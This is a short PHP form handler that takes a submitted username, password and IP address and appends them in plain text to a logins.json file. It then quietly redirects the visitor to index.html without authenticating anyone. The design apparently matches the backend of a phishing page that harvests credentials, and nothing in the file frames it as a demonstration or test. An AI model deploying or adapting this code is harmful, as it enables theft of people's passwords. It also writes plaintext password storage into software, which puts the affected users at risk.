<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize input (we'll want this for when we switch to DB)
    $username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
    $password = filter_var($_POST['password'], FILTER_SANITIZE_STRING);
    // $ipAddress = filter_var($_POST['ipAddress'], FILTER_VALIDATE_IP);
    $ipAddress = isset($_POST['ipAddress']) ? $_POST['ipAddress'] : '';


    // Validate all fields
    if ($username && $password && $ipAddress !== false) {
        // Prepare data as an array
        $data = array(
            'username' => $username,
            'password' => $password,
            'ipAddress' => $ipAddress,
            'timestamp' => date('Y-m-d H:i:s')
        );

        $jsonData = json_encode($data);
        $file = 'logins.json';

        // Attempt to write to the file
        if (file_put_contents($file, $jsonData . PHP_EOL, FILE_APPEND | LOCK_EX) === false) {
            error_log("Error: Unable to write to file $file");
            echo "Error: Unable to write to file.";
        } else {
            // echo "Your information has been submitted.";
            echo '<script>window.location.href = "index.html";</script>';
        }
    } else {
        echo "Invalid data received.";
    }
} else {
    echo "No POST data received.";
}
?>
